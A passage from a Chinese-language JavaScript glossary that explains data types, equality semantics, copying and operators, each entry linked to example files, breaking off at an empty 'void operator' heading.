示例：[`03_data_types/09_symbol_type.js`](03_data_types/09_symbol_type.js)

### Symbol.for 与 Global Symbol Registry（全局符号注册表）

`Symbol.for(key)` 会先查**全局符号注册表**，有则返回已有值，没有才创建，因此同键必然同值（`Symbol.for('a') === Symbol.for('a')` 为 `true`），这是跨模块/跨库共享"同一个符号"的唯一方式；`Symbol.keyFor(sym)` 反查注册表里的键，**只对 `Symbol.for` 创建的有效**，对 `Symbol('a')` 返回 `undefined`。**常见误解**：`Symbol.for('a') !== Symbol('a')` —— 描述相同但一个是注册表里的、一个是全新的，混用会导致属性互相看不见。

示例：[`03_data_types/09_symbol_type.js`](03_data_types/09_symbol_type.js)

### null（空值）

`null` 是原始类型，只有一个值 `null`，语义是**程序级的空值**：由开发者主动赋值，表示"这里我故意留空"（如"用户已注销头像"）。它出现在代码里的场景几乎只有两种：人为赋值，或 JSON 数据显式提供的 `null`（语言内部只有 `Object.getPrototypeOf(Object.prototype) === null` 这个特例）。类型表现上：`typeof null === 'object'`（历史 bug）、`Number(null) === 0`、`JSON.stringify` 会保留 `null`。**常见误解**：`null` 不等于 `0` 也不等于 `''`，虽然在 `==` 下 `null == 0` 为 `false`（只有 `null == undefined` 为 `true`）。也见「undefined」「Nullish Coalescing」。

示例：[`03_data_types/08_null_vs_undefined.js`](03_data_types/08_null_vs_undefined.js)

### undefined（未定义）

`undefined` 是原始类型，只有一个值 `undefined`，语义是**系统级的缺失**：引擎在"没给值"时自动填入。它出现的 6 种场景：变量声明未赋初值、访问不存在的属性、函数没有显式 `return`、调用时省略实参、越界访问数组元素、稀疏数组的空槽。类型表现上：`typeof undefined === 'undefined'`、`Number(undefined) === NaN`（破坏力比 `Number(null) === 0` 大）、`JSON.stringify` 会直接丢弃值为 `undefined` 的属性。**常见误解**：`undefined` 可以被局部变量遮蔽（虽然 `undefined` 不是关键字），但永远不要用 `let undefined = 1` 这种写法。也见「null」。

示例：[`03_data_types/08_null_vs_undefined.js`](03_data_types/08_null_vs_undefined.js)

### Nullish Coalescing（空值合并 `??`）

`a ?? b` 只在 `a` 为 `null` 或 `undefined` 时返回 `b`，否则返回 `a`（注意返回的是**操作数本身**，不一定是布尔）。它存在的理由是修正 `||` 的语义缺陷：`||` 会把 `0`、`''`、`false`、`NaN` 这些合法值当成"空"而吃掉，`count || 10` 在 `count` 为 `0` 时错误地得到 `10`，而 `count ?? 10` 正确得到 `0`。**常见误解**：`??` 不能与 `&&` / `||` 直接混用而不加括号（语法错误），必须写 `(a ?? b) || c`；`??` 的优先级也低于 `+` 等算术运算符。

示例：[`03_data_types/08_null_vs_undefined.js`](03_data_types/08_null_vs_undefined.js)

### Optional Chaining（可选链 `?.`）

`obj?.prop` 在 `obj` 为 `null` 或 `undefined` 时**短路**并返回 `undefined`，不会抛 `TypeError`；同一语义还有 `obj?.[expr]` 与 `fn?.()`。它天然适合处理深层嵌套的接口数据（`res?.data?.user?.name`），且可与 `??` 组合给出默认值。**常见误解**：`?.` 只对 `null` / `undefined` 短路，对不存在的属性同样返回 `undefined` 但**不会**报告"数据缺失"；它也不能防止"中间层存在但类型不对"的错误；过长的 `?.` 链常被视为掩盖数据结构问题，应配合校验使用。

示例：[`03_data_types/08_null_vs_undefined.js`](03_data_types/08_null_vs_undefined.js)

### Truthy / Falsy（真值 / 假值）

凡是出现在布尔上下文（`if`、`while`、`!x`、`&&`/`||`/`??`、三元、`Boolean(x)`、`filter` 回调）的值，引擎都会先做 `ToBoolean` 转换：结果为 `false` 的叫假值，其余全叫真值。**假值只有 8 个，必须背下来**：`false`、`0`、`-0`、`0n`、`''`、`null`、`undefined`、`NaN`。**常见误解**：`'0'`、`'false'`、`' '`（空格）、`[]`、`{}`、`function(){}`、`new Boolean(false)` 全是**真值** —— 所以不能用 `if (arr)` 判断空数组（要用 `arr.length === 0`），也不能用 `if (str)` 判断"用户输入了 0"。

示例：[`03_data_types/10_truthy_falsy.js`](03_data_types/10_truthy_falsy.js)、[`03_data_types/07_boolean_type.js`](03_data_types/07_boolean_type.js)

### Loose Equality `==`（抽象相等比较）

`==` 在两侧类型不同时按规范算法转换后再比：类型相同则退化为 `===`；`null == undefined` 为 `true`（规范特批，且它俩与其它任何值都不相等）；`number` 与 `string` 比较时字符串转数字（`'1' == 1`）；`boolean` 先转数字（`true == 1`、`false == 0`、`'' == 0`、`[] == 0` 都为 `true`）；对象与原始值比较时对象走 `ToPrimitive`；其它组合直接 `false`。**常见误解**：`null == 0` 是 `false`（尽管 `Number(null)` 是 `0`），这是特批规则而非一般转换；`[] == ![]` 为 `true` 就是这套规则的"集大成"陷阱。

示例：[`03_data_types/12_equality_samevalue.js`](03_data_types/12_equality_samevalue.js)

### Strict Equality `===`（严格相等）

`===` 不做任何类型转换：类型不同直接 `false`；都是原始值则比值（`NaN === NaN` 为 `false`，`+0 === -0` 为 `true`）；都是对象则比引用是否同一个。它是工程默认选择。**常见误解**：`===` 不能判断 `NaN`、不能区分正负零，也不能做"内容相等"（`{a:1} === {a:1}` 为 `false`）；另外 `-0 === 0` 为 `true`，想区分只能用 `Object.is`。也见「Loose Equality」「Object.is」「SameValueZero」。

示例：[`03_data_types/12_equality_samevalue.js`](03_data_types/12_equality_samevalue.js)

### Object.is（同值相等 / SameValue）

`Object.is(a, b)` 与 `===` 几乎完全一致，只有两处不同：`Object.is(NaN, NaN)` 为 `true`，`Object.is(0, -0)` 为 `false`。它对应规范里的 **SameValue** 算法，因此是判断 `NaN` 与区分正负零的正确工具。**常见误解**：`Object.is` 不是"深度相等"，对象仍然只比引用（`Object.is({}, {})` 为 `false`）；它也不是 `==` 或 `===` 的替代品，日常比较仍应优先用 `===`。

示例：[`03_data_types/12_equality_samevalue.js`](03_data_types/12_equality_samevalue.js)

### SameValueZero

`SameValueZero` 与 `Object.is` 只差一处：它认为 `+0` 与 `-0` **相等**（同时 `NaN` 等于 `NaN`）。JS 没有直接暴露这个函数，但它是实际开发里最常用的隐式规则：`Map`、`Set` 的键比较，以及 `Array.prototype.includes` 全部使用它。由此推出几个实用结论：`NaN` 可以安全地当 `Map` / `Set` 的键；`[NaN].includes(NaN)` 为 `true` 而 `[NaN].indexOf(NaN)` 为 `-1`；`new Set([0, -0])` 只会保留先插入的那一个。也见「Object.is」「Strict Equality」。

示例：[`03_data_types/12_equality_samevalue.js`](03_data_types/12_equality_samevalue.js)

### Loose vs Strict Equality（松散相等与严格相等的取舍）

工程上的通行准则：**默认一律用 `===`，`==` 只保留一个例外 —— `x == null`**，因为它同时覆盖 `null` 与 `undefined` 且不像 `x === null || x === undefined` 那样啰嗦（该写法可被 ESLint 的 `eqeqeq` 规则配置为允许）。选型逻辑不是"`==` 危险所以禁掉"，而是"`==` 的转换分支有十条，读代码的人无法在 3 秒内判断结果"。**常见误解**：`===` 也无法解决 `NaN`、`-0`、对象引用比较这三类问题，遇到它们要换 `Object.is` 或 `SameValueZero`。

示例：[`03_data_types/12_equality_samevalue.js`](03_data_types/12_equality_samevalue.js)

### Conversion Table（类型转换表）

把"值 → `Number` / `String` / `Boolean`"的映射列成一张表，是排查转换类 bug 最快的方式。几个最容易记错的格子：`[]` → `0` / `''` / `true`；`[5]` → `5` / `'5'` / `true`；`[1,2]` → `NaN` / `'1,2'` / `true`；`{}` → `NaN` / `'[object Object]'` / `true`；`null` → `0` / `'null'` / `false`；`undefined` → `NaN` / `'undefined'` / `false`；`'0'` → `0` / `'0'` / **`true`**。**常见误解**：`null` 转数字是 `0` 而 `undefined` 转数字是 `NaN` —— 这一格不对称是大量"默认值失效"问题的根因。

示例：[`03_data_types/03_type_conversion.js`](03_data_types/03_type_conversion.js)

### Mutability（可变性）

可变指对象的内容可以被**就地修改**（增删改属性、`push` 元素），而变量始终指向同一个引用；`const` 只锁住"绑定"（不能重新赋值），**不锁住对象内容**（`const a = [1]; a.push(2)` 合法，`a = []` 才报错）。想真正冻结对象可用 `Object.freeze`，但它是浅冻结，嵌套对象仍可改。**常见误解**：`const` 等于"不可变"是错的，两者是不同层面的概念。

示例：[`03_data_types/11_mutable_vs_immutable.js`](03_data_types/11_mutable_vs_immutable.js)

### Immutability（不可变性）

不可变指"值一旦创建就永远不变"，7 种原始值全部不可变：所有看起来在改字符串的方法（`toUpperCase`、`slice`、`replace`、`+` 拼接）都返回**新字符串**，原字符串原封不动。工程上追求不可变数据（React / Redux 的核心约束）是为了让"变化"可追踪 —— 旧状态不被污染，比较引用即可判断是否更新。**常见误解**：不可变不等于"不能改"，而是"改的方式是产生新值"；字符串拼接大量文本会产生很多临时对象，应改用数组 `join`。

示例：[`03_data_types/11_mutable_vs_immutable.js`](03_data_types/11_mutable_vs_immutable.js)、[`03_data_types/06_string_type.js`](03_data_types/06_string_type.js)

### Value Semantics vs Reference Semantics（值语义 vs 引用语义）

值语义指赋值/传参时复制的是值本身，两份数据互不影响（所有原始值）；引用语义指复制的是地址，两个变量指向同一个对象，改一个另一个跟着变（所有对象）。**常见误解**：`let b = a` 对对象来说不是"复制了一个对象"，只是多了一个指向同一对象的标签；想断开这层关系必须拷贝（见「Shallow Copy」「Deep Copy」）。写业务代码时的自检问题永远是："这行赋值之后，我改 `b` 会不会影响 `a`？"

示例：[`03_data_types/01_primitives_overview.js`](03_data_types/01_primitives_overview.js)、[`03_data_types/11_mutable_vs_immutable.js`](03_data_types/11_mutable_vs_immutable.js)

### Pass-by-sharing（按共享传参）

JS 的传参既不是"按值"也不是"按引用"，规范精确的说法是**按共享传递（pass-by-sharing / call-by-sharing）**：实参的值被复制给形参，而对象的值就是那个引用。效果是：函数内部**重新赋值**形参不影响外部（`function f(o){ o = {} }` 无效），但**修改形参对象的属性**会影响外部（`function f(o){ o.x = 1 }` 生效）。**常见误解**：说"JS 是引用传递"是错的（那意味着 `o = {}` 也能改到外部）；说"JS 是值传递"又容易被理解成"对象也会被复制"。也见「Value Semantics vs Reference Semantics」。

示例：[`03_data_types/11_mutable_vs_immutable.js`](03_data_types/11_mutable_vs_immutable.js)

### Shallow Copy（浅拷贝）

浅拷贝只复制**第一层**：新对象的顶层属性是独立的，但嵌套的对象/数组仍是共享引用，改副本的嵌套字段会连带改到原对象。常用写法：`{ ...obj }`、`[ ...arr ]`、`Object.assign({}, obj)`、`arr.slice()`、`Array.from(arr)`。**常见误解**：展开运算符是典型的"看起来像深拷贝"的陷阱（`{ ...a }` 对嵌套对象无效）；浅拷贝对"对象里只有原始值"的结构已经足够，不必无脑深拷贝。

示例：[`03_data_types/11_mutable_vs_immutable.js`](03_data_types/11_mutable_vs_immutable.js)

### Deep Copy（深拷贝）

深拷贝递归复制**所有层级**，得到一棵与原对象完全独立的树，是"整体隔离"的唯一手段。现代推荐 `structuredClone(value)`；传统一行流 `JSON.parse(JSON.stringify(v))` 缺点很多：丢失 `undefined` 属性与 `Symbol` 键、`Date` 变字符串、`NaN`/`Infinity` 变 `null`、`Map`/`Set` 变空对象、循环引用直接抛错。**常见误解**：深拷贝不是"更安全的浅拷贝"，它更慢、会丢失原型与 getter/setter，能用不可变更新模式（只改需要改的路径）时优先用后者。

示例：[`03_data_types/11_mutable_vs_immutable.js`](03_data_types/11_mutable_vs_immutable.js)、[`09_objects/12_deep_clone.js`](09_objects/12_deep_clone.js)

### structuredClone（结构化克隆）

`structuredClone(value)` 是平台内置的深拷贝 API（Node 17+ / 现代浏览器），正是 `postMessage` 使用的算法。它支持普通对象、数组、`Date`、`RegExp`、`Map`、`Set`、`ArrayBuffer`/TypedArray、`Blob`/`File` 以及**循环引用**。**常见误解**：它不支持函数、DOM 节点、`Symbol` 作为值（会抛 `DataCloneError`）；类实例会退化成普通对象、丢失原型方法；getter/setter 会被求值成普通数据属性。因此"能 `structuredClone` 就当深拷贝万能药"是错的。

示例：[`03_data_types/11_mutable_vs_immutable.js`](03_data_types/11_mutable_vs_immutable.js)、[`09_objects/12_deep_clone.js`](09_objects/12_deep_clone.js)

### Duck Typing（鸭子类型）

"如果它走起来像鸭子、叫起来像鸭子，那它就是鸭子" —— 判断一个值能否使用，看的是它**有没有所需的方法/属性**，而不是它的构造函数或类型标签。JS 作为动态类型语言天然支持鸭子类型：只要对象有 `.length` 与索引就能被当数组类结构处理，只要实现了 `Symbol.iterator` 就能被 `for...of` 遍历。**常见误解**：鸭子类型不是"没有类型"，而是"类型由行为定义"，因此错误会在运行时报出（`x.foo is not a function`）而非编译期；它的替代/补充是显式的品牌检查（`Array.isArray`、`instanceof`、`Symbol.toStringTag`）。也见「instanceof Operator」。

示例：[`14_classes/14_polymorphism.js`](14_classes/14_polymorphism.js)、[`14_classes/09_instanceof_and_brands.js`](14_classes/09_instanceof_and_brands.js)

---

## 运算符与流程控制

### Operator（运算符）

运算符是一个**符号**，它接收一个或多个值并产出一个新值，例如 `+`、`===`、`? :`、`typeof`。运算符本身不是函数，因此不能被传递或赋值，但绝大多数运算符都能用函数"模拟"（`a + b` 等价于 `add(a, b)`），这也是函数式编程能改写各种表达式的理论基础。关键细节：运算符的**优先级**和**结合性**决定了它和相邻符号怎样组合，而**类型转换规则**决定了操作数会被怎样隐式转换。常见误解是把运算符当成"语句"，实际上除了少数例外（如 `delete`、`void`），运算符构成的是**表达式**，是可以有返回值的。

示例：[`04_operators/01_arithmetic.js`](04_operators/01_arithmetic.js)

### Operand（操作数）

操作数是运算符**作用的对象**，可以是字面量、变量、函数调用或另一个子表达式。在 `a + b * c` 中，`a`、`b`、`c` 都是操作数，而 `b * c` 整体又是 `+` 的一个操作数。关键细节：操作数的**求值顺序**在 JavaScript 中是从左到右（`f() + g()` 一定先调用 `f`），这与优先级无关——优先级只决定"谁和谁结合"，不决定"谁先算"。理解这一点是排查副作用 bug（比如两个函数调用互相影响）的基础。

示例：[`04_operators/10_operator_precedence.js`](04_operators/10_operator_precedence.js)

### Unary operator（一元运算符）

一元运算符只作用于**一个**操作数，如 `-x`、`!flag`、`typeof v`、`void 0`、`delete o.k`、前置 `++i`。关键细节：一元运算符的优先级非常高（仅次于成员访问和函数调用），所以 `-x ** 2` 会直接**报语法错误**——因为它是歧义写法，必须写 `-(x ** 2)` 或 `(-x) ** 2`。常见误解是把 `-` 当成减法：`-5` 里的 `-` 是一元取负，不是二元减法。

示例：[`04_operators/01_arithmetic.js`](04_operators/01_arithmetic.js)

### Binary operator（二元运算符）

二元运算符需要**两个**操作数，如 `+`、`-`、`*`、`%`、`===`、`&&`、`??`。绝大多数我们日常写的运算符都是二元的。关键细节：二元运算符的结合性决定 `a - b - c` 的计算方式——算术运算符是**左结合**，所以等于 `(a - b) - c`；而 `**` 是**右结合**，所以 `2 ** 3 ** 2` 等于 `2 ** (3 ** 2) = 512`，而非 `(2 ** 3) ** 2 = 64`。这是一个很容易踩的坑。也见 Exponentiation、Associativity。

示例：[`04_operators/01_arithmetic.js`](04_operators/01_arithmetic.js)

### Ternary operator（三元运算符 / 条件运算符）

`条件 ? 值1 : 值2` 是 JavaScript 中**唯一**的三元运算符，也是唯一能内联产生"二选一"值的语法。关键细节：它是一个**表达式**而非语句，因此可以出现在 `if/else` 做不到的位置——赋值右侧、函数实参、模板字符串、数组元素、`return` 后面。三元运算符只**求值其中一个分支**（另一分支完全不执行），所以 `x ? 1/0 : 0` 不会真的除零。常见误解是把它当成"简短版 if"，但当两个分支都有副作用或逻辑很长时，它会把代码压得难以阅读，此时应改回 `if/else`。也见 Statement。

示例：[`04_operators/08_ternary_and_comma.js`](04_operators/08_ternary_and_comma.js)

### Arithmetic operators（算术运算符）

五个基础二元算术运算符：`+`、`-`、`*`、`/`、`%`，再加上幂运算符 `**`。关键细节：JavaScript 的数字是 IEEE 754 双精度浮点，所以 `0.1 + 0.2 !== 0.3`（得到 `0.30000000000000004`），这是二进制无法精确表示十进制小数的必然结果，而非 bug。`/` 是浮点除法，`1/0` 得到 `Infinity` 而**不抛异常**；`0/0` 得到 `NaN`。这些行为与整数语言（如 Java、C）差异很大。也见 Remainder。

示例：[`04_operators/01_arithmetic.js`](04_operators/01_arithmetic.js)

### Addition vs concatenation（加法与字符串拼接的双重语义）

`+` 是唯一"身兼两职"的运算符：只要任一操作数**转换后是字符串**，它就执行字符串拼接，否则执行数值加法。判定规则是：先对两个操作数做 `ToPrimitive`，若其中任一个是字符串，就走拼接分支。因此 `1 + 2` 得 `3`，而 `1 + '2'` 得 `'12'`；`'3' * '4'` 却是 `12`（因为 `*` 只做数值运算）。这也是 `[] + {}`、`{} + []` 这类"怪结果"的来源。常见误解是认为 `+` 会优先做加法——它从不"优先"，只看类型。也见 Operator precedence。

示例：[`04_operators/01_arithmetic.js`](04_operators/01_arithmetic.js)

### Remainder（取余运算符 %）

`a % b` 返回 `a` 除以 `b` 的**余数**，符号跟随**被除数**：`-7 % 3` 得到 `-1`（不是 `2`）。关键细节：这不是数学意义上的"模"（modulo），取模要求结果始终非负，所以在需要循环索引、环形缓冲区场景中，必须手写 `((n % m) + m) % m` 来纠正负值。常见用途是判断奇偶（`n % 2 === 0`）和周期取位。注意 `%` 的优先级与 `*`、`/` 同级，且对浮点数同样有效（`5.5 % 2` 得 `1.5`）。也见 Arithmetic operators。

示例：[`04_operators/01_arithmetic.js`](04_operators/01_arithmetic.js)

### Exponentiation（幂运算符 **）

`a ** b` 表示 `a` 的 `b` 次方，是 ES2016 引入的运算符，等价于 `Math.pow(a, b)`。关键细节：它是**右结合**的，`2 ** 3 ** 2` 等于 `2 ** 9 = 512`。它的左侧**不允许**直接放一元运算符，`-2 ** 2` 是语法错误（必须写 `(-2) ** 2` 或 `-(2 ** 2)`），这是为了避免 `-2²` 究竟该读作 `-(2²)` 还是 `(-2)²` 的歧义。也见 Binary operator、Associativity。

示例：[`04_operators/01_arithmetic.js`](04_operators/01_arithmetic.js)

### Increment and decrement（自增与自减 ++ / --）

`++` 和 `--` 让变量加一或减一，是**唯一会修改操作数本身**的算术运算符。关键细节：它能作用于变量、对象属性、数组元素，但**不能作用于字面量或表达式**（`5++` 报错）。它同时有"返回值"和"副作用"两重身份，这正是前置/后置差异的根源。常见误解是以为它只是 `i += 1` 的语法糖——当它出现在更大的表达式中时，两者的求值结果可能不同。也见 Prefix vs postfix。

示例：[`04_operators/01_arithmetic.js`](04_operators/01_arithmetic.js)

### Prefix vs postfix（前置与后置的区别）

前置 `++i` 先自增再返回**新值**，后置 `i++` 先返回**旧值**再自增。关键细节：这条差异只在"自增结果被立即使用"时才可见——单独一行写 `i++;` 与 `++i;` 完全等价。陷阱在于把它嵌进表达式：`let i = 1; const a = i++ + 1;` 得到 `a === 2`、`i === 2`；而 `const b = ++i + 1;` 得到 `b === 4`。常见误解是在 `arr[i++] = arr[i]` 这类写法里指望"先读后写"，实际求值顺序会让同一个 `i` 被读两次。工程上强烈建议把自增单独成行。

示例：[`04_operators/01_arithmetic.js`](04_operators/01_arithmetic.js)

### Assignment operator（赋值运算符）

`=` 把右侧的值写入左侧的目标（变量、属性、解构模式），并且**本身是一个表达式**，返回值就是被赋的值。关键细节：正因为有返回值，才能写链式赋值 `a = b = c = 0`（从右往左依次赋值）。赋值目标必须是"可写的引用"：不能给字面量、函数调用结果或 `const` 变量赋值。常见误解是把 `=` 和 `==` 混淆，`if (x = 1)` 永远为真——这也是 ESLint 的 `no-cond-assign` 规则要拦截的经典 bug。也见 Compound assignment。

示例：[`04_operators/02_assignment.js`](04_operators/02_assignment.js)

### Compound assignment（复合赋值运算符）

`+=`、`-=`、`*=`、`/=`、`%=`、`**=`、`<<=`、`&=` 等把"运算 + 赋值"合并成一步。关键细节：它**只对左操作数求值一次**，因此 `arr[f()] += 1` 只调用一次 `f()`，而 `arr[f()] = arr[f()] + 1` 会调用两次——这是性能与正确性上的真实差异。`+=` 同样受 `+` 的双重语义影响，`'a' += 'b'` 走拼接。常见误解是认为复合赋值总等价于展开写法，当左操作数含副作用时并不成立。

示例：[`04_operators/02_assignment.js`](04_operators/02_assignment.js)

### Logical assignment（逻辑赋值运算符 ||= &&= ??=）

`||=`、`&&=`、`??=` 是 ES2021 引入的复合赋值，但它们是**条件赋值**：只有满足短路条件时才真正写入。`a ||= b` 等价于 `a || (a = b)`，即 `a` 为假值时才赋 `b`；`a &&= b` 在 `a` 为真值时才赋 `b`；`a ??= b` 仅在 `a` 为 `null` / `undefined` 时赋 `b`。关键细节：它们**不会**在条件不满足时求值右侧，因此 `a ??= expensive()` 在 `a` 已有值时不会调用 `expensive`。常见误解是把它当成"总是赋值"的简写，从而误判副作用是否发生。也见 Short-circuit evaluation、Nullish coalescing。

示例：[`04_operators/02_assignment.js`](04_operators/02_assignment.js)

### Comparison operators（比较运算符）

`>`、`<`、`>=`、`<=` 做**大小**比较，`===`、`!==`、`==`、`!=` 做**相等**比较。关键细节：两组运算符的算法完全不同——关系比较走"抽象关系比较"并可能触发数值/`valueOf` 转换，严格相等则**不做任何类型转换**，类型不同直接返回 `false`（`NaN` 甚至不等于自身）。常见误解是把 `<` 用在字符串上期望"按字母顺序"，它确实近似如此，但比的是 UTF-16 码元值，因此 `'Z' < 'a'` 为 `true`、`'10' < '9'` 也为 `true`。也见 Abstract relational comparison、Loose equality。

示例：[`04_operators/03_comparison.js`](04_operators/03_comparison.js)

### Abstract relational comparison（抽象关系比较）

这是规范里对 `>`、`<`、`>=`、`<=` 求值流程的正式名称，核心步骤是"先把两端转成原始值，若都是字符串则按码元比较，否则都转成数字比较"。关键细节：转数字会带来三类边界行为——`NaN` 与任何值比较都返回 `false`（包括 `NaN < NaN`），对象的 `valueOf` / `toString` 可能被调用，`null` 只与 `null` / `undefined` 相等但与其他值比较会被转成 `0`。常见误解是以为 `a >= b` 等价于 `!(a < b)`；当任一操作数是 `NaN` 时，两者都为 `false`，这个"否定不成立"的性质是很多判断逻辑出错的原因。也见 Comparison operators。

示例：[`04_operators/03_comparison.js`](04_operators/03_comparison.js)

### String comparison（字符串比较）

两个字符串用 `<`、`>` 比较时，按 **UTF-16 码元**逐位比较，先出现差异的字符决定结果，且不区分大小写与语言习惯。关键细节：大写字母的码元值小于小写字母，所以 `'Z' < 'a'` 为 `true`；比较从第 0 位开始逐位进行，只要某一位分出大小就立即出结果，所以 `'10' < '9'` 也是 `true`（因为 `'1'` 的码元值小于 `'9'`，后面的 `0` 根本没机会参与比较）。要做"人类可读"的排序必须用 `String.prototype.localeCompare()` 或 `Intl.Collator`。常见误解是把 `==` 当字符串内容比较——它确实比较内容，但 `new String('a') == 'a'` 也会为真。

示例：[`04_operators/03_comparison.js`](04_operators/03_comparison.js)

### Strict equality（严格相等 ===）

`===` 要求**类型与值都相同**才返回 `true`，是唯一推荐的相等判断。关键细节：它的规则简短到可以背下来——类型不同即 `false`；`NaN !== NaN`；`+0 === -0` 为 `true`；两个对象只有在引用同一地址时才相等（`{} === {}` 为 `false`）。若要区分 `+0` / `-0` 或让 `NaN` 等于自身，需用 `Object.is()`。常见误解是认为 `===` 会"深度比较"对象内容——它只比引用。也见 Loose equality。

示例：[`04_operators/03_comparison.js`](04_operators/03_comparison.js)

### Loose equality（宽松相等 ==）

`==` 在类型不同时会先做**隐式转换**再比较，转换规则由规范中的"抽象相等比较"穷举定义，一共只有十几种情况。关键细节：它并非"随机"——`null == undefined` 为 `true`，`0 == ''` 为 `true`，`0 == false` 为 `true`，`[] == false` 为 `true`，而 `[] == ![]` 也为 `true`。这些结果虽可推导，但阅读成本极高。唯一的通行例外是 `x == null` 用来同时判断 `null` 与 `undefined`，简洁且不易错。常见误解是以为可以靠记忆掌握全部规则——绝大多数团队直接禁用它。也见 Strict equality、Truthy and falsy。

示例：[`04_operators/03_comparison.js`](04_operators/03_comparison.js)

### Logical operators（逻辑运算符）

`&&`（与）、`||`（或）、`!`（非）是逻辑运算符，但前两者的行为与布尔代数直觉不同：它们**返回操作数本身**而不是布尔值，并具有短路特性。关键细节：`!` 是一元运算符，总是返回真正的布尔值，所以 `!!x` 是"转布尔"的惯用写法（与 `Boolean(x)` 等价）。常见误解是以为 `a && b` 会先算出两个布尔值再合并——实际它先看 `a`，若 `a` 是假值就**立刻返回 `a`**，完全不碰 `b`。也见 Short-circuit evaluation。

示例：[`04_operators/04_logical.js`](04_operators/04_logical.js)

### Short-circuit evaluation（短路求值）

`&&` 与 `||` 在结果已确定时**不会继续求值右侧**：`a && b` 在 `a` 为假值时直接返回 `a`，`a || b` 在 `a` 为真值时直接返回 `a`。关键点在于它们**返回的是操作数本身，而不是布尔值**——`0 || 'x'` 得到 `'x'`，`'a' && 'b'` 得到 `'b'`。这一特性使它们可以当作「默认值」使用（`name || '匿名'`），但也埋了坑：当合法值是 `0`、`''`、`false` 时会被误判，此时应改用 `??`。短路也常被用作"条件执行"：`isReady && start()`。也见 Nullish coalescing、Logical assignment。

示例：[`04_operators/04_logical.js`](04_operators/04_logical.js)

### Truthy and falsy（真值与假值）

在需要布尔值的上下文（`if`、`&&`、`||`、`!`、三元条件）中，任何值都会被隐式转成布尔。假值只有 8 个：`false`、`0`、`-0`、`0n`、`''`、`null`、`undefined`、`NaN`，**其余全是真值**。关键细节：这让两个反直觉的值成为真值——空数组 `[]` 和空对象 `{}`（因为它们是对象引用）；`'0'`、`' '`、`'false'` 也是真值（非空字符串）。常见误解是以为 `0` 与 `'0'` 同真同假，或以为空数组是假值导致 `if (arr)` 的写法误判空数组——判断数组是否为空要用 `arr.length`。也见 Loose equality。

示例：[`04_operators/04_logical.js`](04_operators/04_logical.js)

### Nullish coalescing（空值合并运算符 ??）

`a ?? b` 只在 `a` 为 `null` 或 `undefined` 时返回 `b`，其余值（包括 `0`、`''`、`false`、`NaN`）都原样返回 `a`。关键细节：它正是为修复 `||` 的"假值误判"而生——配置项里端口号 `0`、开关 `false`、空字符串都是合法值时，`config.port || 3000` 是错的，`config.port ?? 3000` 才对。它同样具有短路特性：`a ?? f()` 在 `a` 非空值时不会调用 `f()`。也见 Short-circuit evaluation、Logical assignment。

示例：[`04_operators/05_nullish_coalescing.js`](04_operators/05_nullish_coalescing.js)

### Mixing ?? with || / &&（?? 不能与 || / && 裸混用）

`a ?? b || c` 是**语法错误**（SyntaxError），必须写成 `(a ?? b) || c` 或 `a ?? (b || c)`。关键细节：这条限制不是随意的——`??` 与 `||` / `&&` 的优先级非常接近，若允许裸混用，读者几乎无法确定结合顺序，规范索性把它定为语法错误强制加括号。对比之下，`??` 与 `?:` 混用时**不需要**括号（`??` 优先级更高），但为可读性仍建议加。常见误解是以为这只是风格问题——它是运行时之前的硬性报错，代码根本不会执行。也见 Operator precedence、Nullish coalescing。

示例：[`04_operators/05_nullish_coalescing.js`](04_operators/05_nullish_coalescing.js)

### Optional chaining（可选链运算符 ?.）

`obj?.prop`、`obj?.[expr]`、`fn?.()` 在左侧为 `null` / `undefined` 时**直接返回 `undefined`**，不再继续访问也不会抛错。关键细节：短路是"整条链"级别的——`a?.b.c` 中若 `a` 为空，后面的 `.c` 完全不求值，因此不会报错；但 `a.b?.c` 中若 `a` 为空仍会抛错，因为 `?.` 只保护它**左边紧邻**的那一段。常见误解是把它当"万能防错"到处加，结果掩盖了本该暴露的 bug；它只对 `null` / `undefined` 生效，对 `0`、`''` 无效。它也**不能**作为赋值目标（`a?.b = 1` 是错误用法）。也见 Nullish coalescing。

示例：[`04_operators/06_optional_chaining.js`](04_operators/06_optional_chaining.js)

### Bitwise operators（位运算符）

`&`（与）、`|`（或）、`^`（异或）、`~`（非）、`<<`、`>>`、`>>>` 按**二进制位**操作。关键细节：运算前两个操作数会被 `ToInt32` / `ToUint32` 转成 **32 位有符号整数**，这意味着所有超过 32 位的信息会被丢弃，大数结果可能"变负"。`>>` 是**有符号右移**（保留符号位，负数补 1），`>>>` 是**无符号右移**（左侧补 0，负数会变成很大的正数）。常见误解是拿 `| 0` 当"取整"用——对超过 2³¹−1 的数会得到错误结果，应改用 `Math.trunc`。

示例：[`04_operators/07_bitwise.js`](04_operators/07_bitwise.js)

### Bitmask / flag（位掩码与权限标志）

用一个整数的每一位表示一个独立的布尔开关，是位运算最主流的工程用途：`const READ = 1 << 0, WRITE = 1 << 1, EXEC = 1 << 2;`。关键细节：置位用 `flags |= WRITE`，检查用 `(flags & WRITE) !== 0`（必须写 `!== 0`，否则当结果恰好是 `0` 时会误判），清位用 `flags &= ~WRITE`，切换用 `flags ^= WRITE`。这样用**一个 32 位整数**就能表示 32 个开关，传输与存储都极省。常见误解是把 `&` 与 `&&` 混用——前者返回数字、不做短路，后者返回操作数并短路。也见 Bitwise operators。

示例：[`04_operators/07_bitwise.js`](04_operators/07_bitwise.js)

### 32-bit signed integer truncation（32 位有符号整数截断）

位运算符（以及 `| 0`、`~~x`、`<<`）在运算前会把操作数通过 `ToInt32` / `ToUint32` 转成 32 位整数，超出范围的位被**静默丢弃**。关键细节：`2 ** 31 | 0` 得到 `-2147483648`（溢出成负数），`2 ** 31 >>> 0` 才能得到 `2147483648`；小数的 `2.9 | 0` 得 `2`（这是"位运算取整"的原理）。常见误解是以为 JS 的数字运算都是 64 位浮点所以位运算也一样安全——恰恰相反，位运算的位宽只有 32 位，是浮点世界里的一个"窄门"。也见 Bitwise operators。

示例：[`04_operators/07_bitwise.js`](04_operators/07_bitwise.js)

### Comma operator（逗号运算符）

逗号在**表达式**里表示"依次求值，返回最后一个的值"：`let x = (a++, b++, a + b);`。关键细节：它的优先级是所有运算符里**最低**的，所以 `let x = 1, y = 2` 里的逗号**不是**逗号运算符，而是 `let` 声明的分隔符，两者语法位置完全不同。在 `for` 的初始化与更新段里它很常用：`for (let i = 0, j = n; i < j; i++, j--)`。常见误解是以为它能在任何地方"返回多个值"——它只返回最后一个，前面的值全部被丢弃。也见 Operator precedence。

示例：[`04_operators/08_ternary_and_comma.js`](04_operators/08_ternary_and_comma.js)

### void operator（void 运算符）

